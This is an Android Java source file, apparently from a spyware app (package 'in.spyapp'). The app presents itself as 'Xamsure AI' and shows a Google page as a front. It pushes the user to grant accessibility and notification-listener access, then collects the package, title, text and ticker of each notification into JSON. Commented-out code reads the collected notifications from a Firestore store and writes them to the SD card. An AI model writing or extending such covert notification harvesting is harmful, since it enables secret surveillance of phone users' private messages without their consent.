package in.spyapp.patanjali.android;

import android.content.Context;
import android.os.Build;
import android.provider.Settings;
import android.support.annotation.RequiresApi;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.widget.TextView;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.Map;


public class MainActivity extends AppCompatActivity {

    JSONArray jsonObject;

    public final void processJson(Map doc)
    {
        Log.d("package", (String) doc.get("package"));
        JSONObject thisDoc = new JSONObject();
        try {
            thisDoc.put("package", (String) doc.get("package"));
            thisDoc.put("time", (String) String.valueOf(doc.get("time")));
            thisDoc.put("text", (String) doc.get("text"));
            thisDoc.put("ticker", (String) doc.get("ticker"));
            thisDoc.put("title", (String) doc.get("title"));

            jsonObject.put(thisDoc);

        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    /*
    private void writeToFile(String data,Context context) {
        try {
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(context.openFileOutput("notifications.json", Context.MODE_PRIVATE));
            outputStreamWriter.write(data);
            outputStreamWriter.close();
        }
        catch (IOException e) {
            Log.e("Exception", "File write failed: " + e.toString());
        }
    }



    public static void WriteFile(String strWrite) {
        String strFileName = "notifications.json"; // file name
        File myFile = new File("sdcard/notify"); // file path
        if (!myFile.exists()) { // directory is exist or not
            myFile.mkdirs();    // if not create new
            Log.e("DataStoreSD 0 ", myFile.toString());
        } else {
            myFile = new File("sdcard/notify");
            Log.e("DataStoreSD 1 ", myFile.toString());
        }

        try {
            File Notefile = new File(myFile, strFileName);
            FileWriter writer = new FileWriter(Notefile); // set file path & name to write
            writer.append("\n" + strWrite + "\n"); // write string
            writer.flush();
            writer.close();
            Log.e("DataStoreSD 2 ", myFile.toString());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

*/
    private int isAccessibilitySettingsOn(Context mContext) {
        String TAG = "ACESSIBILITY TAG CHECK";
        int accessibilityEnabled = 0;
        try {
            accessibilityEnabled = Settings.Secure.getInt(
                    mContext.getApplicationContext().getContentResolver(),
                    android.provider.Settings.Secure.ACCESSIBILITY_ENABLED);
            Log.v(TAG, "accessibilityEnabled = " + accessibilityEnabled);
        } catch (Settings.SettingNotFoundException e) {
            Log.e(TAG, "Error finding setting, default accessibility to not found: "
                    + e.getMessage());
        }
        return accessibilityEnabled;
    }




/*
    public void writeToFileStart()
    {
        WriteFile(jsonObject.toString());
        /*
        Log.d("fileWrite", "run");
        String fileName = "notifications.json";
        String textToWrite = jsonObject.toString();
        FileOutputStream outputStream;

        try {
            outputStream = openFileOutput(fileName , Context.MODE_PRIVATE);
            outputStream.write(textToWrite.getBytes());
            outputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        //writeToFile(jsonObject.toString(), this);

    }
*/
    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    @Override
    protected void onCreate(Bundle savedInstanceState) {

        jsonObject = new JSONArray();
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);



        boolean notificationEnabled = checkNotificationEnabled();
        final TextView textView = (TextView) findViewById(R.id.textView);

        final WebView mWebview = (WebView) findViewById(R.id.webview);
        WebSettings webSettings = mWebview.getSettings();
        webSettings.setJavaScriptEnabled(true);
        mWebview.loadUrl("http://google.co.in");

        if(isAccessibilitySettingsOn(getApplicationContext()) != 1)
        {
            textView.setText("Please enable Xamsure AI in accessibility settings of your phone. Please report to developer if this doesn't solve the problem");
            textView.setVisibility(View.VISIBLE);
            mWebview.setVisibility(View.INVISIBLE);
        }
        else
        {
            if(notificationEnabled == false)
            {
                textView.setText("Please enable notifications in security settings of your phone. Please report to developer if this doesn't solve the problem");
                textView.setVisibility(View.VISIBLE);
                mWebview.setVisibility(View.INVISIBLE);
            }
            else
            {
                textView.setVisibility(View.INVISIBLE);
                mWebview.setVisibility(View.VISIBLE);
            }
        }

        final Map<String, Object> docs[] = new Map[5];


/* SINGLE
        DocumentReference docRef = db.collection("notifications").document("03XZZvyOsALSxsnAtyew");

        docRef.get().addOnCompleteListener(new OnCompleteListener<DocumentSnapshot>() {
            @Override
            public void onComplete(@NonNull Task<DocumentSnapshot> task) {
                String TAG = "dbView";
                if (task.isSuccessful()) {
                    DocumentSnapshot document = task.getResult();
                    if (document.exists()) {
                        Log.d(TAG, "DocumentSnapshot data: " + document.getData());
                        docs[0] = document.getData();
                        processJson(docs[0]);
                        Log.d("jsonDb", jsonObject.toString());
                        WriteFile(jsonObject.toString());
                    } else {
                        Log.d(TAG, "No such document");
                    }
                } else {
                    Log.d(TAG, "get failed with ", task.getException());
                }
            }
        });
*/
/*


*/
/*
db.collection("notifications")
        .get()
        .addOnCompleteListener(new OnCompleteListener<QuerySnapshot>() {
            @Override
            public void onComplete(@NonNull Task<QuerySnapshot> task) {
                String TAG = "viewDb";
                if (task.isSuccessful()) {
                    for (QueryDocumentSnapshot document : task.getResult()) {
                        Log.d(TAG, document.getId() + " => " + document.getData());
                        Log.d(TAG, "DocumentSnapshot data: " + document.getData());
                        docs[0] = document.getData();
                        processJson(docs[0]);
                    }
                } else {
                    Log.d(TAG, "Error getting documents: ", task.getException());
                }
                EditText editText = (EditText) findViewById(R.id.ediText);
                editText.setText(jsonObject.toString());
                editText.setVisibility(View.VISIBLE);
                mWebview.setVisibility(View.INVISIBLE);
                textView.setVisibility(View.INVISIBLE);
                Log.d("jsonDb", jsonObject.toString());
                WriteFile(jsonObject.toString());

            }
        });



        db.collection("androidExport")
                .get()
                .addOnCompleteListener(new OnCompleteListener<QuerySnapshot>() {
                    @Override
                    public void onComplete(@NonNull Task<QuerySnapshot> task) {
                        if (task.isSuccessful()) {
                            for (QueryDocumentSnapshot document : task.getResult()) {
                                Log.d("dbView", document.getId() + " => " + document.getData());
                            }
                        } else {
                            Log.d("dbView", "Error getting documents: ", task.getException());
                        }
                    }
                });
*/




    }

    public boolean checkNotificationEnabled() {
        try{
            if(Settings.Secure.getString(this.getContentResolver(),
                    "enabled_notification_listeners").contains(this.getPackageName()))
            {
                return true;
            } else {
                return false;
            }

        }catch(Exception e) {
            e.printStackTrace();
        }
        return false;
    }
}